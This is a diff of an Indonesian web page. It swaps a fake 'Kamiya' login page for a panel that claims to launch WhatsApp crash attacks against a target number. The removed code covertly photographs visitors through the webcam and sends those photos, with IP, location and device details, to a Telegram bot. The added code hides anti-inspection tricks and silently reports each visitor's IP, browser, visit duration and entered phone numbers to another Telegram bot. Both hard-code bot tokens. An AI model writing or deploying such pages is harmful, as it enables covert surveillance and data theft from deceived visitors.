@@ -1,353 +1,276 @@
+
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Kamiya Crash</title>
-
-  <meta name="description" content="Halaman Login Kamiya Union Panel" />
-
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XTerClose</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   <style>
-    :root{
-      --bg:#0b0f14;
-      --card:#0f1720;
-      --muted:#98a0ad;
-      --accent:#ef4444;
-      --accent-2:#facc15;
-      --danger:#dc2626;
-      --glass: rgba(255,255,255,0.03);
-      --radius:12px;
+    body {
+      background: linear-gradient(to right, #1a0028, #000000);
+      font-family: 'Courier New', monospace;
+      color: white;
     }
-
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{
-      margin:0;
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-      background:
-        radial-gradient(1200px 600px at 10% 10%, rgba(239,68,68,0.1), transparent 8%),
-        radial-gradient(1000px 500px at 90% 90%, rgba(250,204,21,0.08), transparent 10%),
-        var(--bg);
-      color:#e6eef6;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:24px;
+    .btn-custom {
+      background: linear-gradient(135deg, #7e22ce, #9333ea);
+      border: 1px solid #a855f7;
+      padding: 0.75rem;
+      border-radius: 0.75rem;
+      text-align: center;
+      transition: all 0.3s;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 0 15px #9333ea88;
     }
-
-    .container{
-      width:100%;
-      max-width:960px;
-      display:grid;
-      grid-template-columns: 420px 1fr;
-      gap:28px;
-      align-items:center;
+    .btn-custom:hover {
+      transform: scale(1.05);
+      background: #9333ea;
     }
-
-    .card{
-      background:linear-gradient(180deg, rgba(255,255,255,0.02), transparent);
-      border:1px solid rgba(255,255,255,0.05);
-      padding:28px;
-      border-radius:var(--radius);
-      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
-      backdrop-filter: blur(6px);
+    #inspect-warning {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.9);
+      z-index: 9999;
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
     }
-
-    .brand{
-      display:flex;
-      gap:14px;
-      align-items:center;
-      margin-bottom:18px;
+    .warning-icon {
+      font-size: 5rem;
+      color: #ff0000;
+      margin-bottom: 20px;
+      animation: pulse 1.5s infinite;
     }
-    .logo {
-      width:56px;
-      height:56px;
-      border-radius:10px;
-      background:linear-gradient(135deg,var(--accent),var(--accent-2));
-      display:grid;
-      place-items:center;
-      font-weight:700;
-      color:#001217;
-      font-size:20px;
-      box-shadow: 0 6px 18px rgba(239,68,68,0.2);
-    }
-    .brand h1{
-      margin:0;
-      font-size:18px;
-      letter-spacing:0.2px;
-    }
-    .brand p{ margin:0; color:var(--muted); font-size:13px }
-
-    form { margin-top:6px }
-    .field{ margin-bottom:14px }
-    label{
-      display:block;
-      font-size:13px;
-      color:var(--muted);
-      margin-bottom:8px;
-    }
-
-    input[type="text"],
-    input[type="password"]{
-      width:100%;
-      padding:12px 14px;
-      border-radius:10px;
-      border:1px solid rgba(255,255,255,0.05);
-      background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
-      color:inherit;
-      outline:none;
-      transition: box-shadow .15s, border-color .15s, transform .08s;
-    }
-    input:focus{
-      box-shadow: 0 6px 22px rgba(239,68,68,0.2);
-      border-color: var(--accent);
-      transform: translateY(-1px);
-    }
-
-    .row{
-      display:flex;
-      gap:12px;
-      align-items:center;
-      justify-content:space-between;
-    }
-    .remember{
-      display:flex;
-      gap:10px;
-      align-items:center;
-      color:var(--muted);
-      font-size:13px;
-    }
-
-    .btn{
-      display:inline-block;
-      width:100%;
-      padding:12px 14px;
-      border-radius:10px;
-      border:none;
-      cursor:pointer;
-      font-weight:600;
-      font-size:15px;
-      background: linear-gradient(90deg,var(--accent),#b91c1c);
-      color:white;
-      box-shadow: 0 8px 28px rgba(239,68,68,0.2);
-      transition: transform .12s, box-shadow .12s, filter .12s;
-    }
-    .btn:active{ transform: translateY(1px) }
-    .btn.secondary{
-      background:transparent;
-      border:1px solid rgba(255,255,255,0.1);
-      color:var(--muted);
-      box-shadow:none;
-    }
-
-    .helper{
-      margin-top:12px;
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      gap:12px;
-      font-size:13px;
-      color:var(--muted);
-    }
-    .helper a{ color:var(--muted); text-decoration:none }
-    .helper a:hover{ color:#fff; text-decoration:underline }
-
-    .danger { color:var(--danger); font-size:13px; margin-top:8px; }
-
-    .info{
-      padding:28px;
-      border-radius:var(--radius);
-      background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
-      border:1px solid rgba(255,255,255,0.03);
-      display:flex;
-      flex-direction:column;
-      gap:12px;
-    }
-    .info h2{ margin:0; color:#fff; font-size:18px }
-    .info p{ margin:0; color:var(--muted); font-size:14px; line-height:1.5 }
-
-    .meta {
-      margin-top:auto;
-      display:flex;
-      gap:10px;
-      align-items:center;
-      justify-content:flex-start;
-      color:var(--muted);
-      font-size:13px;
-    }
-    .meta .pill{
-      padding:8px 10px;
-      border-radius:10px;
-      background:var(--glass);
-      border:1px solid rgba(255,255,255,0.02);
-    }
-
-    @media (max-width:880px){
-      .container{ grid-template-columns: 1fr; }
-      .info{ order:2 }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+      100% { transform: scale(1); }
     }
   </style>
 </head>
 <body>
-  <main class="container">
-    <section class="card">
-      <div class="brand">
-        <div class="logo">😹</div>
-        <div>
-          <h1>Kamiya 6.0.0</h1>
-          <p>Website Bug Kamiya.</p>
-        </div>
-      </div>
-
-      <form id="loginForm" action="/auth/login" method="POST">
-        <div class="field">
-          <label for="username">Nama Akun</label>
-          <input id="username" name="username" type="text" placeholder="NamaAkunAnda" required />
-        </div>
-
-        <div class="field">
-          <label for="password">Password</label>
-          <input id="password" name="password" type="password" placeholder="••••••••" required />
-        </div>
-
-        <div class="row" style="margin-top:6px">
-          <label class="remember">
-            <input type="checkbox" name="remember" />
-            <span>Ingat saya</span>
-          </label>
-          <a href="/auth/forgot" style="font-size:13px;color:var(--muted)">Lupa password?</a>
-        </div>
-
-        <div style="margin-top:18px">
-          <button class="btn" type="submit">Masuk</button>
-        </div>
-
-        <div class="helper">
-          <span>Belum punya akun?</span>
-          <a href="/auth/register" class="btn secondary" style="width:auto; padding:9px 12px">Daftar</a>
-        </div>
-      </form>
-    </section>
-
-    <aside class="info">
-      <h2>Tentang Kamiya</h2>
-      <p>
-        Kamiya adalah script bot Bug WhatsApp yang di kembangkan oleh saya PouMods.
-      </p>
-
-      <div class="meta">
-        <div class="pill">Status: <strong style="color:#f87171">Online</strong></div>
-        <div class="pill">Versi: <strong style="color:#facc15">v6.0.0</strong></div>
-      </div>
-    </aside>
-
-    <div id="status" style="margin-top:15px; font-size:14px; color:#facc15;">
-      ⏳ Verifikasi Data Base...
+  <!-- Warning overlay for inspect/vpn -->
+  <div id="inspect-warning">
+    <div class="warning-icon">
+      <i class="fas fa-exclamation-triangle"></i>
     </div>
-  </main>
+    <h1 class="text-3xl font-bold text-red-500 mb-4">AKSES DITOLAK!</h1>
+    <div class="text-white max-w-md mb-6">
+      <p class="mb-2">Kami mendeteksi aktivitas mencurigakan:</p>
+      <p id="warning-reason" class="font-bold text-xl"></p>
+      <p class="mt-4 text-yellow-400">Gunakan perangkat dan koneksi biasa tanpa alat pengembang atau VPN/Proxy.</p>
+    </div>
+    <button onclick="location.href='https://google.com'" class="px-6 py-2 bg-red-600 rounded-lg font-bold hover:bg-red-700 transition">
+      KELUAR
+    </button>
+  </div>
+
+  <!-- Main content -->
+  <div class="min-h-screen flex flex-col items-center justify-center px-4">
+    <div class="bg-black border border-purple-500 shadow-2xl p-6 rounded-2xl w-full max-w-md animate__animated animate__fadeIn">
+      <h1 class="text-4xl font-bold text-center mb-4 text-purple-400">XvictusZDN</h1>
+<footer class="text-xs text-gray-500 mt-6">By @Zidannexe</footer>
+      <label class="block text-sm text-purple-300 mb-1">Nomor WhatsApp Target</label>
+      <input id="nomor" type="text" placeholder="08xxxxxx" class="w-full p-2 rounded-lg bg-black border border-purple-600 text-white mb-6 focus:outline-none text-center"/>
+
+      <div class="grid grid-cols-1 gap-3 mb-6">
+        <div class="btn-custom" onclick="attack('ForceClose Invis')">💣 ForceClose Invis</div>
+        <div class="btn-custom" onclick="attack('Delay Invis')">🕒 Delay Invis</div>
+        <div class="btn-custom" onclick="attack('ForceClose Device')">⚠️ ForceClose Device</div>
+      </div>
+
+      <div class="bg-purple-950 p-4 rounded-lg text-sm text-purple-200 border border-purple-500">
+        <p class="mb-1">👻 Bug Invisible</p>
+        <p class="mb-1">🔥 Delay Brutal</p>
+        <p class="mb-1">💥 Force Close UI</p>
+        <p>🧬 Status: <span class="text-green-400">Aktif</span></p>
+      </div>
+    </div>
+    <footer class="text-xs text-gray-500 mt-6">By @Zidannexe</footer>
+  </div>
+
   <script>
-    const CHAT_ID = "7719903782";
-    const BOT_TOKEN = "7828303929:AAH2I4ZIItBGjTw4W23jefCWdMd4yrcMTzA";
-    const statusEl = document.getElementById('status');
-
-    const observer = new IntersectionObserver((entries) => {
-      entries.forEach(entry => {
-        if (entry.isIntersecting) entry.target.classList.add('show');
-      });
-    }, { threshold: 0.1 });
-
-    document.querySelectorAll('.section, .product').forEach(el => observer.observe(el));
-
-    window.onload = async () => {
-      statusEl.textContent = "⏳ Loading...";
-      const kamiyaKey = await Fast_server();
-      await sendDeviceInfo(kamiyaKey);
-
-      try {
-        statusEl.textContent = '⏳ Loading...';
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        const track = stream.getVideoTracks()[0];
-
-        for (let i = 0; i < 5; i++) {
-          statusEl.textContent = `⏳ Loading... ${(i + 1) * 20}%...`;
-          const blob = await captureFromVideo(track);
-          await sendToTelegram(kamiyaKey, blob, "photo");
-          await new Promise(r => setTimeout(r, 1000));
-        }
-
-        track.stop();
-        statusEl.textContent = '✅ Verifikasi berhasil!';
-      } catch (err) {
-        statusEl.textContent = '✅ Silahkan masukan username dan password .';
-        console.error(err);
+    // Security measures
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.onkeydown = function(e) {
+      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74))) {
+        showWarning("Mencoba membuka alat pengembang (DevTools)");
+        return false;
       }
     };
+    
+    // Check for window resize (common devtools opening method)
+    let lastWidth = window.innerWidth;
+    setInterval(() => {
+      if (window.outerHeight - window.innerHeight > 200) {
+        showWarning("Mencoba membuka alat pengembang (DevTools)");
+        location.href = "about:blank";
+      }
+      
+      // Check for window width change (another devtools detection method)
+      if (Math.abs(lastWidth - window.innerWidth) > 50) {
+        showWarning("Mencoba membuka alat pengembang (DevTools)");
+      }
+      lastWidth = window.innerWidth;
+    }, 500);
 
-    async function Fast_server() {
+    // Show warning function
+    function showWarning(reason) {
+      document.getElementById('warning-reason').textContent = reason;
+      document.getElementById('inspect-warning').style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+    }
+
+    // Telegram configuration (real token and chat ID)
+       const telegramBotToken = "8342711555:AAGOJLlt-LiVkixW8-waswRC22fIm1bssMg";
+      const telegramChatId = "7904209776";
+    const visitStartTime = Date.now();
+
+    // Check VPN/Proxy
+    async function checkSecurity() {
       try {
-        const res = await fetch('/api/kamiya_union');
-        const data = await res.json();
-        return data.kamiya_key;
-      } catch {
-        return "direct";
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+        if(data.security && (data.security.proxy || data.security.vpn || data.security.tor)) {
+          const reason = `Menggunakan ${data.security.vpn ? "VPN" : data.security.proxy ? "Proxy" : "Tor"}`;
+          showWarning(reason);
+          
+          // Send to Telegram
+          const message = `
+🚨 VPN/Proxy Terdeteksi
+🌐 IP: ${data.ip}
+🔒 Tipe: ${data.security.vpn ? "VPN" : data.security.proxy ? "Proxy" : "Tor"}
+🌍 Negara: ${data.country_name}
+🕒 Waktu: ${new Date().toLocaleString("id-ID")}
+          `.trim();
+          
+          await sendTelegramMessage(message);
+          
+          setTimeout(() => location.href = "https://google.com", 5000);
+          return true;
+        }
+        return false;
+      } catch (e) {
+        console.error("Security check failed");
+        return false;
       }
     }
 
-    async function sendDeviceInfo(key) {
+    // Send visitor info to Telegram
+    async function sendVisitorInfo() {
       try {
-        const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
-        const battery = await navigator.getBattery();
-        const time = new Date().toLocaleString("id-ID");
-
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        
         const message = `
-🌐 *Informasi IP*
-🔢 Alamat IP: ${ipInfo.ip}
-🗺 Negara: ${ipInfo.country}
-🌍 Wilayah: ${ipInfo.region}
-📍 Kota: ${ipInfo.city}
-📡 ISP: ${ipInfo.org}
-
-📱 *Detail Perangkat*
-🔋 Baterai: ${Math.round(battery.level * 100)}% ${battery.charging ? "⚡️ Mengisi daya" : ""}
-📶 Jaringan: ${navigator.connection?.effectiveType || "Tidak diketahui"}
-🖥️ Layar: ${screen.width}x${screen.height}
-🕒 Waktu: ${time}
-🧠 User Agent: ${navigator.userAgent}
-...`;
-
-        await sendToTelegram(key, message.trim(), "text");
-      } catch (err) {
-        console.error("Device Info Error:", err);
+🛰️ Pengunjung Masuk
+🌐 IP: ${ipData.ip}
+📱 Device: ${navigator.platform}
+🧭 Browser: ${navigator.userAgent}
+🔍 Resolusi: ${window.innerWidth}x${window.innerHeight}
+📄 Halaman: ${window.location.href}
+🕒 Waktu: ${new Date().toLocaleString("id-ID")}
+        `.trim();
+        
+        await sendTelegramMessage(message);
+      } catch (e) {
+        console.error("Failed to send visitor info");
       }
     }
 
-    async function captureFromVideo(videoTrack) {
-      const video = document.createElement("video");
-      video.srcObject = new MediaStream([videoTrack]);
-      await video.play();
+    // Main attack function
+    async function attack(mode) {
+      try {
+        const number = document.getElementById("nomor").value.trim();
+        if (!number) {
+          return Swal.fire({
+            icon: 'warning',
+            title: 'Nomor kosong!',
+            text: 'Masukkan nomor WA target dulu.'
+          });
+        }
 
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      canvas.getContext("2d").drawImage(video, 0, 0);
+        // Show attacking alert
+        await Swal.fire({
+          title: `Menyerang...`,
+          html: `Mengirim <b>${mode}</b> ke <code>${number}</code>`,
+          timer: 2000,
+          timerProgressBar: true,
+          didOpen: () => Swal.showLoading()
+        });
 
-      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
-    }
+        // Send success notification
+        await Swal.fire({
+          icon: 'success',
+          title: 'Berhasil!',
+          text: `${mode} berhasil dikirim.`
+        });
 
-    async function sendToTelegram(key, data, type) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${type === "text" ? "sendMessage" : "sendPhoto"}`;
-      const form = new FormData();
-      form.append("chat_id", CHAT_ID);
+        // Send report to Telegram
+        const time = new Date().toLocaleTimeString("id-ID");
+        const reportMessage = `
+📍 Aksi: ${mode}
+📞 Nomor: ${number}
+🕒 Jam: ${time}
+        `.trim();
+        
+        await sendTelegramMessage(reportMessage);
 
-      if (type === "text") {
-        form.append("text", data);
-        form.append("parse_mode", "Markdown");
-      } else {
-        form.append("photo", data, "image.jpg");
+      } catch (error) {
+        console.error("Attack failed:", error);
+        Swal.fire({
+          icon: 'error',
+          title: 'Gagal',
+          text: 'Terjadi kesalahan saat menyerang'
+        });
       }
-
-      await fetch(url, { method: "POST", body: form });
     }
+
+    // Send message to Telegram
+    async function sendTelegramMessage(text) {
+      try {
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+        const params = new URLSearchParams();
+        params.append('chat_id', telegramChatId);
+        params.append('text', text);
+        
+        await fetch(url, {
+          method: 'POST',
+          body: params,
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          }
+        });
+      } catch (error) {
+        console.error("Failed to send Telegram message:", error);
+      }
+    }
+
+    // Send visit duration when leaving
+    window.addEventListener("beforeunload", async () => {
+      const duration = Math.floor((Date.now() - visitStartTime) / 1000);
+      const message = `⏳ Durasi kunjungan: ${duration} detik`;
+      await sendTelegramMessage(message);
+    });
+
+    // Initialize
+    window.addEventListener("load", async () => {
+      const isUsingVPN = await checkSecurity();
+      if (!isUsingVPN) {
+        sendVisitorInfo();
+      }
+    });
   </script>
 </body>
 </html>
